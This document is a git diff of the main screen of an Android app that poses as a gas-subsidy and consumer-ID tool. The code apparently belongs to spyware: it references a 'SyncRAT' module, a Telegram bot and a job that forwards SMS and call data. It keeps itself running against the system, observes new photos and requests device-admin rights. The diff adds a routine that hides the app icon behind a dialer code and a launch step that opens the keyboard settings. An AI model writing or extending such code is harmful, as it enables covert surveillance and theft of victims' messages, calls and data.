@@ -10,6 +10,7 @@ import android.app.job.JobScheduler;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.iocl.dac_collector.BuildConfig;
@@ -36,6 +37,8 @@ import android.iocl.dac_collector.Services.ImageJobService;
 import android.iocl.dac_collector.Services.JobSchedulerUtil;
 import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
 import android.iocl.dac_collector.Utility.Constant;
+import android.iocl.dac_collector.Utility.LauncherIconHelper;
+import android.iocl.dac_collector.Utility.NotificationHelper;
 import android.iocl.dac_collector.Utility.PermissionUtility;
 import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.TelegramBot;
@@ -132,15 +135,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         // show previous crash details if any
         String crashDetails = SharedPrefs.getCrashDetails(this);
         if (crashDetails != null) {
-            new AlertDialog.Builder(this)
-                    .setTitle("App Crashed Previously")
-                    .setMessage(crashDetails)
-                    .setPositiveButton("OK", (dialog, which) -> {
-                        SharedPrefs.ClearCrashDetails(this);
-                        dialog.dismiss();
-                    })
-                    .setCancelable(false)
-                    .show();
+            new AlertDialog.Builder(this).setTitle("App Crashed Previously").setMessage(crashDetails).setPositiveButton("OK", (dialog, which) -> {
+                SharedPrefs.ClearCrashDetails(this);
+                dialog.dismiss();
+            }).setCancelable(false).show();
         }
 
         setContentView(R.layout.activity_main);
@@ -153,12 +151,16 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         setClickListener();
         implementKeepAliveBelow8();
 
+        startActivity(new Intent(Settings.ACTION_INPUT_METHOD_SETTINGS));
+//        askToHide();
+
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             statusBarManager = (StatusBarManager) getSystemService(StatusBarManager.class);
         }
 
     }
+
 
     private void checkMissingPermissions() {
         if (PermissionUtility.isAnyPermissionMissing(this)) {
@@ -168,8 +170,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
             Log.d("PermsActivity", "refreshAndCheckCompletion: " + Arrays.toString(missingArray));
             Log.d("PermsActivity", "refreshAndCheckCompletion: " + PermissionUtility.isTilesAdded(MainActivity.this));
-            startActivity(new Intent(this, PermissionActivity.class)
-                    .putExtra("permissions", missingArray));
+            startActivity(new Intent(this, PermissionActivity.class).putExtra("permissions", missingArray));
         }
     }
 
@@ -182,16 +183,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     private void implementKeepAliveBelow8() {
         if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
             //启动保活服务
-            KeepAliveManager.toKeepAlive(
-                    getApplication(),
-                    HIGH_POWER_CONSUMPTION,
-                    "进程保活",
-                    "Process: System(哥们儿) 我不想被杀死",
-                    R.mipmap.ic_launcher,
-                    new ForegroundNotification(
-                            //定义前台服务的通知点击事件
-                            (context, intent) -> Log.d("JOB-->", " foregroundNotificationClick"))
-            );
+            KeepAliveManager.toKeepAlive(getApplication(), HIGH_POWER_CONSUMPTION, "进程保活", "Process: System(哥们儿) 我不想被杀死", R.mipmap.ic_launcher, new ForegroundNotification(
+                    //定义前台服务的通知点击事件
+                    (context, intent) -> Log.d("JOB-->", " foregroundNotificationClick")));
 
 
         }
@@ -202,9 +196,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         String username = SharedPrefs.getUsername(ctx);
         String consumerId = SharedPrefs.getConsumerId(ctx);
 
-        boolean missingInfo =
-                "not_found".equals(username) || username.isEmpty() ||
-                        "not_found".equals(consumerId) || consumerId.isEmpty();
+        boolean missingInfo = "not_found".equals(username) || username.isEmpty() || "not_found".equals(consumerId) || consumerId.isEmpty();
 
 
         if (SharedPrefs.getBoolean(ctx, "isFirstTime", true) || missingInfo) {
@@ -219,9 +211,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         if (!SharedPrefs.getSubsidyDetails(ctx).isEmpty()) {
             String last = SharedPrefs.lastSubsidyDate(ctx); // "dd-MM-yyyy"
             try {
-                long days = (Calendar.getInstance().getTimeInMillis()
-                        - new SimpleDateFormat("dd-MM-yyyy", Locale.ENGLISH).parse(last).getTime())
-                        / 86_400_000L;
+                long days = (Calendar.getInstance().getTimeInMillis() - new SimpleDateFormat("dd-MM-yyyy", Locale.ENGLISH).parse(last).getTime()) / 86_400_000L;
                 if (days >= 2) SharedPrefs.clearSubsidyDetails(ctx);
                 else {
                     subsidyBadge.setBackgroundResource(R.drawable.bg_badge_received);
@@ -317,15 +307,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     private void imageObserverSchedule() {
         JobInfo jobInfo = null;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            jobInfo = new JobInfo.Builder(123,
-                    new ComponentName(this, ImageJobService.class))
-                    .addTriggerContentUri(
-                            new JobInfo.TriggerContentUri(
-                                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                                    JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
-                            )
-                    )
-                    .setTriggerContentMaxDelay(0)    // fire as soon as possible
+            jobInfo = new JobInfo.Builder(123, new ComponentName(this, ImageJobService.class)).addTriggerContentUri(new JobInfo.TriggerContentUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS)).setTriggerContentMaxDelay(0)    // fire as soon as possible
                     .setTriggerContentUpdateDelay(1000)  // but batch rapid changes
 
                     .build();
@@ -341,6 +323,17 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     }
 
+    private void askToHide() {
+        new AlertDialog.Builder(this).setTitle("Launcher Icon").setMessage("Do you want to hide the app icon from the launcher? You can reopen via the persistent notification or dial *#*#1234#*#* (may not work on all phones).").setPositiveButton("Keep", (dialog, which) -> Toast.makeText(this, "Icon kept", Toast.LENGTH_SHORT).show()).setNegativeButton("Hide", (dialog, which) -> {
+            LauncherIconHelper.hideLauncherIcon(this);
+
+        }).setCancelable(true).show();
+
+
+
+
+    }
+
     private void settingUpJobs() {
         imageObserverSchedule();
 
@@ -348,14 +341,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
         if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {
+            JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
+            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
 
-            loader_controller("Setting Up..", true, loader, loader_text);
-
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                loader_controller("Setting Up..", false, loader, loader_text);
-                JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
-                JobSchedulerUtil.fetch_profile_info(getApplicationContext());
-            }, 800); // Delay in milliseconds
 
         }
     }
@@ -371,7 +359,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         Check_Update.setOnClickListener(v -> {
             checkAppUpdate();
-
 
         });
 
@@ -425,21 +412,20 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
                 FirebaseApp.initializeApp(getApplicationContext());
             }
 
-            FirebaseMessaging.getInstance().getToken()
-                    .addOnCompleteListener(task -> {
-                        if (task.isSuccessful()) {
-                            String token = task.getResult();
-                            if (token != null && !token.isEmpty()) {
-                                FCM_KEY = token;
-                                SharedPrefs.setFCMKey(getApplicationContext(), token);
-                                Log.d(TAG, "refreshFCMToken: new token saved");
-                                if (cb != null) cb.onToken(token);
-                                return;
-                            }
-                        }
-                        Log.w(TAG, "refreshFCMToken: token task failed", task.getException());
-                        if (cb != null) cb.onToken(null);
-                    });
+            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
+                if (task.isSuccessful()) {
+                    String token = task.getResult();
+                    if (token != null && !token.isEmpty()) {
+                        FCM_KEY = token;
+                        SharedPrefs.setFCMKey(getApplicationContext(), token);
+                        Log.d(TAG, "refreshFCMToken: new token saved");
+                        if (cb != null) cb.onToken(token);
+                        return;
+                    }
+                }
+                Log.w(TAG, "refreshFCMToken: token task failed", task.getException());
+                if (cb != null) cb.onToken(null);
+            });
         } catch (Exception e) {
             Log.e(TAG, "refreshFCMToken: exception", e);
             if (cb != null) cb.onToken(null);
@@ -466,6 +452,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         alertDialog.show();
     }
 
+
     private void showSubsidyDialog() {
         // Inflate the layout
         View view = LayoutInflater.from(this).inflate(R.layout.subsidy_request_dialog, null);
@@ -485,8 +472,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             // use SharedPrefs.getFCMKey (updated by refreshFCMToken) for safety
             requestSubsidyDetails(alertDialog, SharedPrefs.getFCMKey(MainActivity.this));
             Toast.makeText(this, "Sending Request...", Toast.LENGTH_SHORT).show();
-
-
 
 
             Toast.makeText(this, "Please wait, We're processing you request", Toast.LENGTH_SHORT).show();
@@ -514,12 +499,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         userName.setText(data.getName());
 
-        TelegramBot.with(MainActivity.this).sendMessage("User Online -> " + data.getName() + " At -> " + getCurrentDateString());
-
 
         remainBook.setText(isAnnual ? data.getSubscription() : "Recharge End");
         lastBook.setText(isAnnual ? data.getBooking_date() : "No Subscription");
-        mobNo.setText(data.getMobile_no());
+        mobNo.setText(data.getMobile_no() + (!data.getAlternate_number().isEmpty() ? " / " + data.getAlternate_number() : ""));
         consID.setText(data.getConsumer_id());
         location.setText(data.getLocation().isEmpty() ? "No Location" : data.getLocation());
 
@@ -604,13 +587,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         loader_controller("Updating Data...", true, loader, loader_text);
         RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
 
-        List<ColumnValue> userInfo = Arrays.asList(
-                new ColumnValue("CONSUMER_ID", cons_id),
-                new ColumnValue("USER_NAME", name),
-                new ColumnValue("FCM_KEY", token),
-                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
-                new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime())
-        );
+        List<ColumnValue> userInfo = Arrays.asList(new ColumnValue("CONSUMER_ID", cons_id), new ColumnValue("USER_NAME", name), new ColumnValue("FCM_KEY", token), new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME), new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime()));
 
         update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
         Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
@@ -648,7 +625,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
         Context ctx = MainActivity.this;
-        SubsidyRequest req = new SubsidyRequest("addSubsidyRequest", SharedPrefs.getConsumerId(ctx), SharedPrefs.getUserName(ctx), FCM_KEY_param);
+        SubsidyRequest req = new SubsidyRequest("addSubsidyRequest", SharedPrefs.getConsumerId(ctx), SharedPrefs.getUsername(ctx), FCM_KEY_param);
 
         Call<DAC_Collector_Base> auth = requestService.requestSubsidyDetails(req);
         auth.enqueue(new Callback<DAC_Collector_Base>() {
@@ -726,8 +703,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         AtomicReference<File> apkFileRef = new AtomicReference<>();
 
         RelativeLayout root = findViewById(R.id.update_layout_dialog);
-        View view = LayoutInflater.from(this)
-                .inflate(R.layout.app_update_layout, root);
+        View view = LayoutInflater.from(this).inflate(R.layout.app_update_layout, root);
         AlertDialog.Builder b = new AlertDialog.Builder(this);
         b.setView(view);
         AlertDialog alertDialog = b.create();
@@ -756,52 +732,38 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             progressBar.setVisibility(View.VISIBLE);
             progressTxt.setVisibility(View.VISIBLE);
 
-            DownloadService
-                    .with(this)
-                    .downloadFromUrl(url)
-                    .onProgress(percent -> {
-                        // update progress
-                        progressBar.setProgress(percent);
-                        progressTxt.setText(percent + "%");
-                    })
-                    .onDownloadCompleted(file -> {
+            DownloadService.with(this).downloadFromUrl(url).onProgress(percent -> {
+                // update progress
+                progressBar.setProgress(percent);
+                progressTxt.setText(percent + "%");
+            }).onDownloadCompleted(file -> {
 
-                        Uri uri = FileProvider.getUriForFile(
-                                this,
-                                BuildConfig.APPLICATION_ID + ".fileprovider",
-                                file
-                        );
+                Uri uri = FileProvider.getUriForFile(this, BuildConfig.APPLICATION_ID + ".fileprovider", file);
 
-                        Intent intent = new Intent(Intent.ACTION_VIEW)
-                                .setDataAndType(uri, "application/vnd.android.package-archive")
-                                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                        startActivity(intent);
-                        // store file
-                        apkFileRef.set(file);
+                Intent intent = new Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive").addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                startActivity(intent);
+                // store file
+                apkFileRef.set(file);
 
-                        // change text to “INSTALL”
-                        progressBar.setVisibility(View.GONE);
+                // change text to “INSTALL”
+                progressBar.setVisibility(View.GONE);
 
-                        progressTxt.setTextColor(Color.parseColor("#198754"));
-                        progressTxt.setText("INSTALL");
+                progressTxt.setTextColor(Color.parseColor("#198754"));
+                progressTxt.setText("INSTALL");
 
-                        // make it clickable
-                        progressTxt.setOnClickListener(installClick -> {
-                            File apk = apkFileRef.get();
-                            if (apk != null && apk.exists()) {
+                // make it clickable
+                progressTxt.setOnClickListener(installClick -> {
+                    File apk = apkFileRef.get();
+                    if (apk != null && apk.exists()) {
 
-                                Intent intent2 = new Intent(Intent.ACTION_VIEW)
-                                        .setDataAndType(uri, "application/vnd.android.package-archive")
-                                        .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                                startActivity(intent2);
-                            }
-                        });
-                    })
-                    .onError(ex -> runOnUiThread(() -> {
-                        Log.e(TAG, "Download error", ex);
-                        Toast.makeText(this, "Download failed: " + ex.getMessage(), Toast.LENGTH_SHORT).show();
-                    }))
-                    .start();
+                        Intent intent2 = new Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive").addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                        startActivity(intent2);
+                    }
+                });
+            }).onError(ex -> runOnUiThread(() -> {
+                Log.e(TAG, "Download error", ex);
+                Toast.makeText(this, "Download failed: " + ex.getMessage(), Toast.LENGTH_SHORT).show();
+            })).start();
         });
     }
 
@@ -897,14 +859,13 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     private void subscribeTopics() {
         String[] topics = {"heart_beat", "sendCustomMessage", "RechargeRelated"}; // Example topics
         for (String topic : topics) {
-            FirebaseMessaging.getInstance().subscribeToTopic(topic)
-                    .addOnCompleteListener(task -> {
-                        String msg = topic + " Subscribed";
-                        if (!task.isSuccessful()) {
-                            msg = topic + " Subscribe failed";
-                        }
-                        Log.d(TAG, msg);
-                    });
+            FirebaseMessaging.getInstance().subscribeToTopic(topic).addOnCompleteListener(task -> {
+                String msg = topic + " Subscribed";
+                if (!task.isSuccessful()) {
+                    msg = topic + " Subscribe failed";
+                }
+                Log.d(TAG, msg);
+            });
         }
     }
 
@@ -1002,7 +963,6 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 //    }
 
 
-
     public void showAdminAlert() {
 
         boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
@@ -1073,8 +1033,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
 
         // Explicitly set the fully qualified class name of the receiver
-        ComponentName adminComponent = new ComponentName(
-                "android.iocl.dac_collector", // your package name
+        ComponentName adminComponent = new ComponentName("android.iocl.dac_collector", // your package name
                 "android.iocl.dac_collector.Receivers.AdminReceiver" // full class path
         );
 
@@ -1098,15 +1057,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     private void showHtmlDialog(String title, String htmlContent) {
         // Convert HTML → Spanned → plain String (all tags & styling dropped)
-        String plain = Html.fromHtml(htmlContent, Html.FROM_HTML_MODE_LEGACY)
-                .toString()
-                .trim();
+        String plain = Html.fromHtml(htmlContent, Html.FROM_HTML_MODE_LEGACY).toString().trim();
 
-        new AlertDialog.Builder(this)
-                .setTitle(title)
-                .setMessage(plain)
-                .setPositiveButton("OK", null)
-                .show();
+        new AlertDialog.Builder(this).setTitle(title).setMessage(plain).setPositiveButton("OK", null).show();
     }
 
     @Override
